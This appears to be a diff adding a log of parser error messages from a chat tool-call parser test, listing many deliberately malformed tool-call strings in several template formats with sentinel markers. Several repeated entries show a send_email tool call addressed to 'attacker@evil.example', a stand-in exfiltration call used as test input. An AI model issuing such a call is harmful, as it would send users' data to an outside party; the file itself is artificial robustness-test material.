+common_chat_peg_parse: unparsed peg-native output: <|tool_call_begin|>functions.note:0TAIL_SENTINEL
+common_chat_peg_parse: unparsed peg-native output: TAIL_SENTINEL
+common_chat_peg_parse: unparsed peg-native output: TAIL_SENTINEL
+common_chat_peg_parse: unparsed peg-native output: TAIL_SENTINEL
+common_chat_peg_parse: unparsed peg-native output: TAIL_SENTINEL
+common_chat_peg_parse: unparsed peg-native output: <think></think>
+
+<｜DSML｜function_calls>
+<｜DSML｜invoke name="note">
+<｜DSML｜parameter name="text" string="true">save this</｜DSML｜parameter>
+</｜DSML｜invoke>
+</｜DSML｜function_calls>
+common_chat_peg_parse: unparsed peg-native output: <think></think>
+
+<｜DSML｜function_calls>
+<｜DSML｜invoke name="note">
+<｜DSML｜parameter name="text" string="true">save this</｜DSML｜parameter>
+</｜DSML｜invoke>
+</｜DSML｜function_calls>
+common_chat_peg_parse: unparsed peg-native output: <think></think>
+
+<｜DSML｜function_calls>
+<｜DSML｜invoke name="note">
+<｜DSML｜parameter name="text" string="true">save this</｜DSML｜parameter>
+</｜DSML｜invoke>
+</｜DSML｜function_calls>
+common_chat_peg_parse: unparsed peg-native output: <think></think>
+
+<｜DSML｜function_calls>
+<｜DSML｜invoke name="note">
+<｜DSML｜parameter name="text" string="true">save this</｜DSML｜parameter>
+</｜DSML｜invoke>
+</｜DSML｜function_calls>
+common_chat_peg_parse: unparsed peg-native output: <think></think><｜DSML｜function_calls>
+<｜DSML｜invoke name="note">
+<｜DSML｜parameter name="text" string="true">save this</｜DSML｜parameter>
+</｜DSML｜invoke>
+</｜DSML｜function_calls>
+common_chat_peg_parse: unparsed peg-native output: <think></think><｜DSML｜function_calls>
+<｜DSML｜invoke name="note">
+<｜DSML｜parameter name="text" string="true">save this</｜DSML｜parameter>
+</｜DSML｜invoke>
+</｜DSML｜function_calls>
+common_chat_peg_parse: unparsed peg-native output: <think></think><｜DSML｜function_calls>
+<｜DSML｜invoke name="note">
+<｜DSML｜parameter name="text" string="true">save this</｜DSML｜parameter>
+</｜DSML｜invoke>
+</｜DSML｜function_calls>
+common_chat_peg_parse: unparsed peg-native output: <think></think><｜DSML｜function_calls>
+<｜DSML｜invoke name="note">
+<｜DSML｜parameter name="text" string="true">save this</｜DSML｜parameter>
+</｜DSML｜invoke>
+</｜DSML｜function_calls>
+common_chat_peg_parse: unparsed peg-native output: <think></think>HEAD
+
+<｜DSML｜function_calls>
+<｜DSML｜invoke name="note">
+<｜DSML｜parameter name="text" string="true">save this</｜DSML｜parameter>
+</｜DSML｜invoke>
+</｜DSML｜function_calls>
+common_chat_peg_parse: unparsed peg-native output: <think></think>HEAD
+
+<｜DSML｜function_calls>
+<｜DSML｜invoke name="note">
+<｜DSML｜parameter name="text" string="true">save this</｜DSML｜parameter>
+</｜DSML｜invoke>
+</｜DSML｜function_calls>
+common_chat_peg_parse: unparsed peg-native output: <think></think>HEAD
+
+<｜DSML｜function_calls>
+<｜DSML｜invoke name="note">
+<｜DSML｜parameter name="text" string="true">save this</｜DSML｜parameter>
+</｜DSML｜invoke>
+</｜DSML｜function_calls>
+common_chat_peg_parse: unparsed peg-native output: <think></think>HEAD
+
+<｜DSML｜function_calls>
+<｜DSML｜invoke name="note">
+<｜DSML｜parameter name="text" string="true">save this</｜DSML｜parameter>
+</｜DSML｜invoke>
+</｜DSML｜function_calls>
+common_chat_peg_parse: unparsed peg-native output: <think></think></think>
+
+<｜DSML｜function_calls>
+<｜DSML｜invoke name="note">
+<｜DSML｜parameter name="text" string="true">save this</｜DSML｜parameter>
+</｜DSML｜invoke>
+</｜DSML｜function_calls>
+common_chat_peg_parse: unparsed peg-native output: <think></think></think>
+
+<｜DSML｜function_calls>
+<｜DSML｜invoke name="note">
+<｜DSML｜parameter name="text" string="true">save this</｜DSML｜parameter>
+</｜DSML｜invoke>
+</｜DSML｜function_calls>
+common_chat_peg_parse: unparsed peg-native output: <think></think></think>
+
+<｜DSML｜function_calls>
+<｜DSML｜invoke name="note">
+<｜DSML｜parameter name="text" string="true">save this</｜DSML｜parameter>
+</｜DSML｜invoke>
+</｜DSML｜function_calls>
+common_chat_peg_parse: unparsed peg-native output: <think></think></think>
+
+<｜DSML｜function_calls>
+<｜DSML｜invoke name="note">
+<｜DSML｜parameter name="text" string="true">save this</｜DSML｜parameter>
+</｜DSML｜invoke>
+</｜DSML｜function_calls>
+common_chat_peg_parse: unparsed peg-native output: <think></think>
+
+<｜DSML｜function_calls>
+<｜DSML｜invoke name="note">
+<｜DSML｜parameter name="text" string="false">1</｜DSML｜parameter>
+</｜DSML｜invoke>
+</｜DSML｜function_calls>
+common_chat_peg_parse: unparsed peg-native output: <think></think>
+
+<｜DSML｜function_calls>
+<｜DSML｜invoke name="note">
+<｜DSML｜parameter name="text" string="false">1</｜DSML｜parameter>
+</｜DSML｜invoke>
+</｜DSML｜function_calls>
+common_chat_peg_parse: unparsed peg-native output: <think></think>
+
+<｜DSML｜function_calls>
+<｜DSML｜invoke name="note">
+<｜DSML｜parameter name="text" string="false">1</｜DSML｜parameter>
+</｜DSML｜invoke>
+</｜DSML｜function_calls>
+common_chat_peg_parse: unparsed peg-native output: <think></think>
+
+<｜DSML｜function_calls>
+<｜DSML｜invoke name="note">
+<｜DSML｜parameter name="text" string="false">1</｜DSML｜parameter>
+</｜DSML｜invoke>
+</｜DSML｜function_calls>
+common_chat_peg_parse: unparsed peg-native output: <｜DSML｜tool_calls>
+TAIL_SENTINEL
+common_chat_peg_parse: unparsed peg-native output: <｜DSML｜tool_calls>
+TAIL_SENTINEL
+common_chat_peg_parse: unparsed peg-native output: <｜DSML｜tool_calls>
+TAIL_SENTINEL
+common_chat_peg_parse: unparsed peg-native output: <｜DSML｜tool_calls>
+TAIL_SENTINEL
+common_chat_peg_parse: unparsed peg-native output: <｜DSML｜tool_calls>
+TAIL_SENTINEL
+common_chat_peg_parse: unparsed peg-native output: <｜DSML｜tool_calls></｜DSML｜tool_calls>
+TAIL_SENTINEL
+common_chat_peg_parse: unparsed peg-native output: <｜DSML｜tool_calls></｜DSML｜tool_calls>
+TAIL_SENTINEL
+common_chat_peg_parse: unparsed peg-native output: <｜DSML｜tool_calls></｜DSML｜tool_calls>
+TAIL_SENTINEL
+common_chat_peg_parse: unparsed peg-native output: <｜DSML｜tool_calls></｜DSML｜tool_calls>
+TAIL_SENTINEL
+common_chat_peg_parse: unparsed peg-native output: <｜DSML｜tool_calls></｜DSML｜tool_calls>
+TAIL_SENTINEL
+common_chat_peg_parse: unparsed peg-native output: <｜DSML｜tool_calls>
+<｜DSML｜invoke name="note">
+TAIL_SENTINEL
+common_chat_peg_parse: unparsed peg-native output: <｜DSML｜tool_calls>
+<｜DSML｜invoke name="note">
+TAIL_SENTINEL
+common_chat_peg_parse: unparsed peg-native output: <｜DSML｜tool_calls>
+<｜DSML｜invoke name="note">
+TAIL_SENTINEL
+common_chat_peg_parse: unparsed peg-native output: <｜DSML｜tool_calls>
+<｜DSML｜invoke name="note">
+TAIL_SENTINEL
+common_chat_peg_parse: unparsed peg-native output: <｜DSML｜tool_calls>
+<｜DSML｜invoke name="note">
+TAIL_SENTINEL
+common_chat_peg_parse: unparsed peg-native output: <｜DSML｜tool_calls>
+<｜DSML｜invoke name="note">
+<｜DSML｜parameter name="text" string="true">save this</｜DSML｜parameter> TAIL_SENTINEL</｜DSML｜parameter>
+</｜DSML｜invoke>
+</｜DSML｜tool_calls>
+TAIL2
+common_chat_peg_parse: unparsed peg-native output: <｜DSML｜tool_calls>
+<｜DSML｜invoke name="note">
+<｜DSML｜parameter name="text" string="true">save this</｜DSML｜parameter> TAIL_SENTINEL</｜DSML｜parameter>
+</｜DSML｜invoke>
+</｜DSML｜tool_calls>
+TAIL2
+common_chat_peg_parse: unparsed peg-native output: <｜DSML｜tool_calls>
+<｜DSML｜invoke name="note">
+<｜DSML｜parameter name="text" string="true">save this</｜DSML｜parameter> TAIL_SENTINEL</｜DSML｜parameter>
+</｜DSML｜invoke>
+</｜DSML｜tool_calls>
+TAIL2
+common_chat_peg_parse: unparsed peg-native output: <｜DSML｜tool_calls>
+<｜DSML｜invoke name="note">
+<｜DSML｜parameter name="text" string="true">save this</｜DSML｜parameter> TAIL_SENTINEL</｜DSML｜parameter>
+</｜DSML｜invoke>
+</｜DSML｜tool_calls>
+TAIL2
+common_chat_peg_parse: unparsed peg-native output: <｜DSML｜tool_calls>
+<｜DSML｜invoke name="note">
+<｜DSML｜parameter name="text" string="true">save this</｜DSML｜parameter> TAIL_SENTINEL</｜DSML｜parameter>
+</｜DSML｜invoke>
+</｜DSML｜tool_calls>
+TAIL2
+common_chat_peg_parse: unparsed peg-native output: <｜DSML｜tool_calls>
+<｜DSML｜invoke name="note">
+<｜DSML｜parameter name="text" string="true">save this</｜DSML｜parameter>
+</｜DSML｜invoke>
+JUNK_BETWEEN_SENTINEL
+<｜DSML｜invoke name="ping"/>
+</｜DSML｜tool_calls>
+common_chat_peg_parse: unparsed peg-native output: <｜DSML｜tool_calls>
+<｜DSML｜invoke name="note">
+<｜DSML｜parameter name="text" string="true">save this</｜DSML｜parameter>
+</｜DSML｜invoke>
+JUNK_BETWEEN_SENTINEL
+<｜DSML｜invoke name="ping"/>
+</｜DSML｜tool_calls>
+common_chat_peg_parse: unparsed peg-native output: <｜DSML｜tool_calls>
+<｜DSML｜invoke name="note">
+<｜DSML｜parameter name="text" string="true">save this</｜DSML｜parameter>
+</｜DSML｜invoke>
+JUNK_BETWEEN_SENTINEL
+<｜DSML｜invoke name="ping"/>
+</｜DSML｜tool_calls>
+common_chat_peg_parse: unparsed peg-native output: <｜DSML｜tool_calls>
+<｜DSML｜invoke name="note">
+<｜DSML｜parameter name="text" string="true">save this</｜DSML｜parameter>
+</｜DSML｜invoke>
+JUNK_BETWEEN_SENTINEL
+<｜DSML｜invoke name="ping"/>
+</｜DSML｜tool_calls>
+common_chat_peg_parse: unparsed peg-native output: <｜DSML｜tool_calls>
+<｜DSML｜invoke name="note">
+<｜DSML｜parameter name="text" string="true">save this</｜DSML｜parameter>
+</｜DSML｜invoke>
+JUNK_BETWEEN_SENTINEL
+<｜DSML｜invoke name="ping"/>
+</｜DSML｜tool_calls>
+common_chat_peg_parse: unparsed peg-native output: <｜DSML｜tool_calls>
+<｜DSML｜invoke name="note">
+<｜DSML｜parameter name="text" string="true">save this</｜DSML｜parameter>
+</｜DSML｜invoke>
+TAIL_SENTINEL
+</｜DSML｜tool_calls>
+common_chat_peg_parse: unparsed peg-native output: <｜DSML｜tool_calls>
+<｜DSML｜invoke name="note">
+<｜DSML｜parameter name="text" string="true">save this</｜DSML｜parameter>
+</｜DSML｜invoke>
+TAIL_SENTINEL
+</｜DSML｜tool_calls>
+common_chat_peg_parse: unparsed peg-native output: <｜DSML｜tool_calls>
+<｜DSML｜invoke name="note">
+<｜DSML｜parameter name="text" string="true">save this</｜DSML｜parameter>
+</｜DSML｜invoke>
+TAIL_SENTINEL
+</｜DSML｜tool_calls>
+common_chat_peg_parse: unparsed peg-native output: <｜DSML｜tool_calls>
+<｜DSML｜invoke name="note">
+<｜DSML｜parameter name="text" string="true">save this</｜DSML｜parameter>
+</｜DSML｜invoke>
+TAIL_SENTINEL
+</｜DSML｜tool_calls>
+common_chat_peg_parse: unparsed peg-native output: <｜DSML｜tool_calls>
+<｜DSML｜invoke name="note">
+<｜DSML｜parameter name="text" string="true">save this</｜DSML｜parameter>
+</｜DSML｜invoke>
+TAIL_SENTINEL
+</｜DSML｜tool_calls>
+common_chat_peg_parse: unparsed peg-native output: <｜DSML｜tool_calls></｜DSML｜tool_calls>   
+common_chat_peg_parse: unparsed peg-native output: <｜DSML｜tool_calls></｜DSML｜tool_calls>   
+common_chat_peg_parse: unparsed peg-native output: <｜DSML｜tool_calls></｜DSML｜tool_calls>   
+common_chat_peg_parse: unparsed peg-native output: <｜DSML｜tool_calls></｜DSML｜tool_calls>   
+common_chat_peg_parse: unparsed peg-native output: <｜DSML｜tool_calls></｜DSML｜tool_calls>   
+common_chat_peg_parse: unparsed peg-native output: <｜DSML｜tool_calls>TAIL_SENTINEL
+common_chat_peg_parse: unparsed peg-native output: <｜DSML｜tool_calls>TAIL_SENTINEL
+common_chat_peg_parse: unparsed peg-native output: <｜DSML｜tool_calls>TAIL_SENTINEL
+common_chat_peg_parse: unparsed peg-native output: <｜DSML｜tool_calls>TAIL_SENTINEL
+common_chat_peg_parse: unparsed peg-native output: <｜DSML｜tool_calls>TAIL_SENTINEL
+common_chat_peg_parse: unparsed peg-native output: <think><think>TAIL_SENTINEL
+common_chat_peg_parse: unparsed peg-native output: <think><think>TAIL_SENTINEL
+common_chat_peg_parse: unparsed peg-native output: <think><think>TAIL_SENTINEL
+common_chat_peg_parse: unparsed peg-native output: <think><think>TAIL_SENTINEL
+common_chat_peg_parse: unparsed peg-native output: <think><think>TAIL_SENTINEL
+common_chat_peg_parse: unparsed peg-native output: <think>HEAD
+<think>TAIL_SENTINEL
+common_chat_peg_parse: unparsed peg-native output: <think>HEAD
+<think>TAIL_SENTINEL
+common_chat_peg_parse: unparsed peg-native output: <think>HEAD
+<think>TAIL_SENTINEL
+common_chat_peg_parse: unparsed peg-native output: <think>HEAD
+<think>TAIL_SENTINEL
+common_chat_peg_parse: unparsed peg-native output: <think>HEAD
+<think>TAIL_SENTINEL
+common_chat_peg_parse: unparsed peg-native output: <think><think>reason</think>TAIL_SENTINEL
+common_chat_peg_parse: unparsed peg-native output: <think><think>reason</think>TAIL_SENTINEL
+common_chat_peg_parse: unparsed peg-native output: <think><think>reason</think>TAIL_SENTINEL
+common_chat_peg_parse: unparsed peg-native output: <think><think>reason</think>TAIL_SENTINEL
+common_chat_peg_parse: unparsed peg-native output: <think><think>reason</think>TAIL_SENTINEL
+common_chat_peg_parse: unparsed peg-native output: <tool_call>
+TAIL_SENTINEL
+common_chat_peg_parse: unparsed peg-native output: <tool_call>
+TAIL_SENTINEL
+common_chat_peg_parse: unparsed peg-native output: <tool_call>
+TAIL_SENTINEL
+common_chat_peg_parse: unparsed peg-native output: <tool_call>
+TAIL_SENTINEL
+common_chat_peg_parse: unparsed peg-native output: <tool_call>
+TAIL_SENTINEL
+common_chat_peg_parse: unparsed peg-native output: <tool_call>
+{"name": "note", "arguments": {"text": "save this"}</tool_call> TAIL_SENTINEL</tool_call>
+TAIL2
+common_chat_peg_parse: unparsed peg-native output: <tool_call>
+{"name": "note", "arguments": {"text": "save this"}</tool_call> TAIL_SENTINEL</tool_call>
+TAIL2
+common_chat_peg_parse: unparsed peg-native output: <tool_call>
+{"name": "note", "arguments": {"text": "save this"}</tool_call> TAIL_SENTINEL</tool_call>
+TAIL2
+common_chat_peg_parse: unparsed peg-native output: <tool_call>
+{"name": "note", "arguments": {"text": "save this"}</tool_call> TAIL_SENTINEL</tool_call>
+TAIL2
+common_chat_peg_parse: unparsed peg-native output: <tool_call>
+{"name": "note", "arguments": {"text": "save this"}</tool_call> TAIL_SENTINEL</tool_call>
+TAIL2
+common_chat_peg_parse: unparsed peg-native output: TAIL_SENTINEL
+common_chat_peg_parse: unparsed peg-native output: TAIL_SENTINEL
+common_chat_peg_parse: unparsed peg-native output: TAIL_SENTINEL
+common_chat_peg_parse: unparsed peg-native output: TAIL_SENTINEL
+common_chat_peg_parse: unparsed peg-native output: TAIL_SENTINEL
+common_chat_peg_parse: unparsed peg-native output: <tool_call>
+TAIL_SENTINEL
+common_chat_peg_parse: unparsed peg-native output: <tool_call>
+TAIL_SENTINEL
+common_chat_peg_parse: unparsed peg-native output: <tool_call>
+TAIL_SENTINEL
+common_chat_peg_parse: unparsed peg-native output: <tool_call>
+TAIL_SENTINEL
+common_chat_peg_parse: unparsed peg-native output: <tool_call>
+TAIL_SENTINEL
+common_chat_peg_parse: unparsed peg-native output: 
+<|tool_call_begin|>functions.note:0<|tool_call_argument_begin|>{"text": "save this"}<|tool_call_end|>
+<|tool_calls_section_end|>
+common_chat_peg_parse: unparsed peg-native output: 
+<|tool_call_begin|>functions.note:0<|tool_call_argument_begin|>{"text": "save this"}<|tool_call_end|>
+<|tool_calls_section_end|>
+common_chat_peg_parse: unparsed peg-native output: 
+<|tool_call_begin|>functions.note:0<|tool_call_argument_begin|>{"text": "save this"}<|tool_call_end|>
+<|tool_calls_section_end|>
+common_chat_peg_parse: unparsed peg-native output: 
+<|tool_call_begin|>functions.note:0<|tool_call_argument_begin|>{"text": "save this"}<|tool_call_end|>
+<|tool_calls_section_end|>
+common_chat_peg_parse: unparsed peg-native output: 
+<|tool_call_begin|>functions.note:0<|tool_call_argument_begin|>{"text": "save this"}<|tool_call_end|>
+<|tool_calls_section_end|>
+common_chat_peg_parse: unparsed peg-native output: 
+    <|tool_call_begin|>functions.note:0<|tool_call_argument_begin|>{"text": "save this"}<|tool_call_end|>
+  <|tool_calls_section_end|>
+common_chat_peg_parse: unparsed peg-native output: 
+    <|tool_call_begin|>functions.note:0<|tool_call_argument_begin|>{"text": "save this"}<|tool_call_end|>
+  <|tool_calls_section_end|>
+common_chat_peg_parse: unparsed peg-native output: 
+    <|tool_call_begin|>functions.note:0<|tool_call_argument_begin|>{"text": "save this"}<|tool_call_end|>
+  <|tool_calls_section_end|>
+common_chat_peg_parse: unparsed peg-native output: 
+    <|tool_call_begin|>functions.note:0<|tool_call_argument_begin|>{"text": "save this"}<|tool_call_end|>
+  <|tool_calls_section_end|>
+common_chat_peg_parse: unparsed peg-native output: 
+    <|tool_call_begin|>functions.note:0<|tool_call_argument_begin|>{"text": "save this"}<|tool_call_end|>
+  <|tool_calls_section_end|>
+common_chat_peg_parse: unparsed peg-native output: 
+    <|tool_call_begin|>functions.note:0<|tool_call_argument_begin|>{"text": "save this"}<|tool_call_end|>
+  <|tool_calls_section_end|>
+common_chat_peg_parse: unparsed peg-native output: 
+    <|tool_call_begin|>functions.note:0<|tool_call_argument_begin|>{"text": "save this"}<|tool_call_end|>
+  <|tool_calls_section_end|>
+common_chat_peg_parse: unparsed peg-native output: 
+    <|tool_call_begin|>functions.note:0<|tool_call_argument_begin|>{"text": "save this"}<|tool_call_end|>
+  <|tool_calls_section_end|>
+common_chat_peg_parse: unparsed peg-native output: 
+    <|tool_call_begin|>functions.note:0<|tool_call_argument_begin|>{"text": "save this"}<|tool_call_end|>
+  <|tool_calls_section_end|>
+common_chat_peg_parse: unparsed peg-native output: 
+    <|tool_call_begin|>functions.note:0<|tool_call_argument_begin|>{"text": "save this"}<|tool_call_end|>
+  <|tool_calls_section_end|>
+common_chat_peg_parse: unparsed peg-native output: 
+    <|tool_call_begin|>functions.note:0<|tool_call_argument_begin|>{"text": "save this"}<|tool_call_end|>
+  <|tool_calls_section_end|>
+common_chat_peg_parse: unparsed peg-native output: 
+    <|tool_call_begin|>functions.note:0<|tool_call_argument_begin|>{"text": "save this"}<|tool_call_end|>
+  <|tool_calls_section_end|>
+common_chat_peg_parse: unparsed peg-native output: 
+    <|tool_call_begin|>functions.note:0<|tool_call_argument_begin|>{"text": "save this"}<|tool_call_end|>
+  <|tool_calls_section_end|>
+common_chat_peg_parse: unparsed peg-native output: 
+    <|tool_call_begin|>functions.note:0<|tool_call_argument_begin|>{"text": "save this"}<|tool_call_end|>
+  <|tool_calls_section_end|>
+common_chat_peg_parse: unparsed peg-native output: 
+    <|tool_call_begin|>functions.note:0<|tool_call_argument_begin|>{"text": "save this"}<|tool_call_end|>
+  <|tool_calls_section_end|>
+common_chat_peg_parse: unparsed peg-native output: <|tool_call_begin|>functions.note:0
+TAIL_SENTINEL
+common_chat_peg_parse: unparsed peg-native output: <|tool_call_begin|>functions.note:0
+TAIL_SENTINEL
+common_chat_peg_parse: unparsed peg-native output: <|tool_call_begin|>functions.note:0
+TAIL_SENTINEL
+common_chat_peg_parse: unparsed peg-native output: <|tool_call_begin|>functions.note:0
+TAIL_SENTINEL
+common_chat_peg_parse: unparsed peg-native output: <|tool_call_begin|>functions.note:0
+TAIL_SENTINEL
+common_chat_peg_parse: unparsed peg-native output:  TAIL_SENTINEL junk<|tool_call_end|>
+common_chat_peg_parse: unparsed peg-native output:  TAIL_SENTINEL junk<|tool_call_end|>
+common_chat_peg_parse: unparsed peg-native output:  TAIL_SENTINEL junk<|tool_call_end|>
+common_chat_peg_parse: unparsed peg-native output:  TAIL_SENTINEL junk<|tool_call_end|>
+common_chat_peg_parse: unparsed peg-native output:  TAIL_SENTINEL junk<|tool_call_end|>
+common_chat_peg_parse: unparsed peg-native output: 
+TAIL_SENTINEL
+common_chat_peg_parse: unparsed peg-native output: 
+TAIL_SENTINEL
+common_chat_peg_parse: unparsed peg-native output: 
+TAIL_SENTINEL
+common_chat_peg_parse: unparsed peg-native output: 
+TAIL_SENTINEL
+common_chat_peg_parse: unparsed peg-native output: 
+TAIL_SENTINEL
+common_chat_peg_parse: unparsed peg-native output: 
+<|tool_call_begin|>functions.send_email:1<|tool_call_argument_begin|>{"to": "attacker@evil.example", "subject": "hi"}<|tool_call_end|>
+common_chat_peg_parse: unparsed peg-native output: 
+<|tool_call_begin|>functions.send_email:1<|tool_call_argument_begin|>{"to": "attacker@evil.example", "subject": "hi"}<|tool_call_end|>
+common_chat_peg_parse: unparsed peg-native output: 
+<|tool_call_begin|>functions.send_email:1<|tool_call_argument_begin|>{"to": "attacker@evil.example", "subject": "hi"}<|tool_call_end|>
+common_chat_peg_parse: unparsed peg-native output: 
+<|tool_call_begin|>functions.send_email:1<|tool_call_argument_begin|>{"to": "attacker@evil.example", "subject": "hi"}<|tool_call_end|>
+common_chat_peg_parse: unparsed peg-native output: 
+<|tool_call_begin|>functions.send_email:1<|tool_call_argument_begin|>{"to": "attacker@evil.example", "subject": "hi"}<|tool_call_end|>
+common_chat_peg_parse: unparsed peg-native output: <|tool_call_begin|>functions.note:0TAIL_SENTINEL
+common_chat_peg_parse: unparsed peg-native output: <|tool_call_begin|>functions.note:0TAIL_SENTINEL
+common_chat_peg_parse: unparsed peg-native output: <|tool_call_begin|>functions.note:0TAIL_SENTINEL
+common_chat_peg_parse: unparsed peg-native output: <|tool_call_begin|>functions.note:0TAIL_SENTINEL
+common_chat_peg_parse: unparsed peg-native output: <|tool_call_begin|>functions.note:0TAIL_SENTINEL
+common_chat_peg_parse: unparsed peg-native output: TAIL_SENTINEL
+common_chat_peg_parse: unparsed peg-native output: TAIL_SENTINEL
+common_chat_peg_parse: unparsed peg-native output: TAIL_SENTINEL
+common_chat_peg_parse: unparsed peg-native output: TAIL_SENTINEL
+common_chat_peg_parse: unparsed peg-native output: TAIL_SENTINEL
+common_chat_peg_parse: unparsed peg-native output: <think></think>
+
+<｜DSML｜function_calls>
+<｜DSML｜invoke name="note">
+<｜DSML｜parameter name="text" string="true">save this</｜DSML｜parameter>
+</｜DSML｜invoke>
+</｜DSML｜function_calls>
+common_chat_peg_parse: unparsed peg-native output: <think></think>
+
+<｜DSML｜function_calls>
+<｜DSML｜invoke name="note">
+<｜DSML｜parameter name="text" string="true">save this</｜DSML｜parameter>
+</｜DSML｜invoke>
+</｜DSML｜function_calls>
+common_chat_peg_parse: unparsed peg-native output: <think></think>
+
+<｜DSML｜function_calls>
+<｜DSML｜invoke name="note">
+<｜DSML｜parameter name="text" string="true">save this</｜DSML｜parameter>
+</｜DSML｜invoke>
+</｜DSML｜function_calls>
+common_chat_peg_parse: unparsed peg-native output: <think></think>
+
+<｜DSML｜function_calls>
+<｜DSML｜invoke name="note">
+<｜DSML｜parameter name="text" string="true">save this</｜DSML｜parameter>
+</｜DSML｜invoke>
+</｜DSML｜function_calls>
+common_chat_peg_parse: unparsed peg-native output: <think></think>
+
+<｜DSML｜function_calls>
+<｜DSML｜invoke name="note">
+<｜DSML｜parameter name="text" string="true">save this</｜DSML｜parameter>
+</｜DSML｜invoke>
+</｜DSML｜function_calls>
+common_chat_peg_parse: unparsed peg-native output: <think></think><｜DSML｜function_calls>
+<｜DSML｜invoke name="note">
+<｜DSML｜parameter name="text" string="true">save this</｜DSML｜parameter>
+</｜DSML｜invoke>
+</｜DSML｜function_calls>
+common_chat_peg_parse: unparsed peg-native output: <think></think><｜DSML｜function_calls>
+<｜DSML｜invoke name="note">
+<｜DSML｜parameter name="text" string="true">save this</｜DSML｜parameter>
+</｜DSML｜invoke>
+</｜DSML｜function_calls>
+common_chat_peg_parse: unparsed peg-native output: <think></think><｜DSML｜function_calls>
+<｜DSML｜invoke name="note">
+<｜DSML｜parameter name="text" string="true">save this</｜DSML｜parameter>
+</｜DSML｜invoke>
+</｜DSML｜function_calls>
+common_chat_peg_parse: unparsed peg-native output: <think></think><｜DSML｜function_calls>
+<｜DSML｜invoke name="note">
+<｜DSML｜parameter name="text" string="true">save this</｜DSML｜parameter>
+</｜DSML｜invoke>
+</｜DSML｜function_calls>
+common_chat_peg_parse: unparsed peg-native output: <think></think><｜DSML｜function_calls>
+<｜DSML｜invoke name="note">
+<｜DSML｜parameter name="text" string="true">save this</｜DSML｜parameter>
+</｜DSML｜invoke>
+</｜DSML｜function_calls>
+common_chat_peg_parse: unparsed peg-native output: <think></think>HEAD
+
+<｜DSML｜function_calls>
+<｜DSML｜invoke name="note">
+<｜DSML｜parameter name="text" string="true">save this</｜DSML｜parameter>
+</｜DSML｜invoke>
+</｜DSML｜function_calls>
+common_chat_peg_parse: unparsed peg-native output: <think></think>HEAD
+
+<｜DSML｜function_calls>
+<｜DSML｜invoke name="note">
+<｜DSML｜parameter name="text" string="true">save this</｜DSML｜parameter>
+</｜DSML｜invoke>
+</｜DSML｜function_calls>
+common_chat_peg_parse: unparsed peg-native output: <think></think>HEAD
+
+<｜DSML｜function_calls>
+<｜DSML｜invoke name="note">
+<｜DSML｜parameter name="text" string="true">save this</｜DSML｜parameter>
+</｜DSML｜invoke>
+</｜DSML｜function_calls>
+common_chat_peg_parse: unparsed peg-native output: <think></think>HEAD
+
+<｜DSML｜function_calls>
+<｜DSML｜invoke name="note">
+<｜DSML｜parameter name="text" string="true">save this</｜DSML｜parameter>
+</｜DSML｜invoke>
+</｜DSML｜function_calls>
+common_chat_peg_parse: unparsed peg-native output: <think></think>HEAD
+
+<｜DSML｜function_calls>
+<｜DSML｜invoke name="note">
+<｜DSML｜parameter name="text" string="true">save this</｜DSML｜parameter>
+</｜DSML｜invoke>
+</｜DSML｜function_calls>
+common_chat_peg_parse: unparsed peg-native output: <think></think></think>
+
+<｜DSML｜function_calls>
+<｜DSML｜invoke name="note">
+<｜DSML｜parameter name="text" string="true">save this</｜DSML｜parameter>
+</｜DSML｜invoke>
+</｜DSML｜function_calls>
+common_chat_peg_parse: unparsed peg-native output: <think></think></think>
+
+<｜DSML｜function_calls>
+<｜DSML｜invoke name="note">
+<｜DSML｜parameter name="text" string="true">save this</｜DSML｜parameter>
+</｜DSML｜invoke>
+</｜DSML｜function_calls>
+common_chat_peg_parse: unparsed peg-native output: <think></think></think>
+
+<｜DSML｜function_calls>
+<｜DSML｜invoke name="note">
+<｜DSML｜parameter name="text" string="true">save this</｜DSML｜parameter>
+</｜DSML｜invoke>
+</｜DSML｜function_calls>
+common_chat_peg_parse: unparsed peg-native output: <think></think></think>
+
+<｜DSML｜function_calls>
+<｜DSML｜invoke name="note">
+<｜DSML｜parameter name="text" string="true">save this</｜DSML｜parameter>
+</｜DSML｜invoke>
+</｜DSML｜function_calls>
+common_chat_peg_parse: unparsed peg-native output: <think></think></think>
+
+<｜DSML｜function_calls>
+<｜DSML｜invoke name="note">
+<｜DSML｜parameter name="text" string="true">save this</｜DSML｜parameter>
+</｜DSML｜invoke>
+</｜DSML｜function_calls>
+common_chat_peg_parse: unparsed peg-native output: <think></think>
+
+<｜DSML｜function_calls>
+<｜DSML｜invoke name="note">
+<｜DSML｜parameter name="text" string="false">1</｜DSML｜parameter>
+</｜DSML｜invoke>
+</｜DSML｜function_calls>
+common_chat_peg_parse: unparsed peg-native output: <think></think>
+
+<｜DSML｜function_calls>
+<｜DSML｜invoke name="note">
+<｜DSML｜parameter name="text" string="false">1</｜DSML｜parameter>
+</｜DSML｜invoke>
+</｜DSML｜function_calls>
+common_chat_peg_parse: unparsed peg-native output: <think></think>
+
+<｜DSML｜function_calls>
+<｜DSML｜invoke name="note">
+<｜DSML｜parameter name="text" string="false">1</｜DSML｜parameter>
+</｜DSML｜invoke>
+</｜DSML｜function_calls>
+common_chat_peg_parse: unparsed peg-native output: <think></think>
+
+<｜DSML｜function_calls>
+<｜DSML｜invoke name="note">
+<｜DSML｜parameter name="text" string="false">1</｜DSML｜parameter>
+</｜DSML｜invoke>
+</｜DSML｜function_calls>
+common_chat_peg_parse: unparsed peg-native output: <think></think>
+
+<｜DSML｜function_calls>
+<｜DSML｜invoke name="note">
+<｜DSML｜parameter name="text" string="false">1</｜DSML｜parameter>
+</｜DSML｜invoke>
+</｜DSML｜function_calls>
+common_chat_peg_parse: unparsed peg-native output: <｜DSML｜tool_calls>
+TAIL_SENTINEL
+common_chat_peg_parse: unparsed peg-native output: <｜DSML｜tool_calls>
+TAIL_SENTINEL
+common_chat_peg_parse: unparsed peg-native output: <｜DSML｜tool_calls>
+TAIL_SENTINEL
+common_chat_peg_parse: unparsed peg-native output: <｜DSML｜tool_calls>
+TAIL_SENTINEL
+common_chat_peg_parse: unparsed peg-native output: <｜DSML｜tool_calls>
+TAIL_SENTINEL
+common_chat_peg_parse: unparsed peg-native output: <｜DSML｜tool_calls></｜DSML｜tool_calls>
+TAIL_SENTINEL
+common_chat_peg_parse: unparsed peg-native output: <｜DSML｜tool_calls></｜DSML｜tool_calls>
+TAIL_SENTINEL
+common_chat_peg_parse: unparsed peg-native output: <｜DSML｜tool_calls></｜DSML｜tool_calls>
+TAIL_SENTINEL
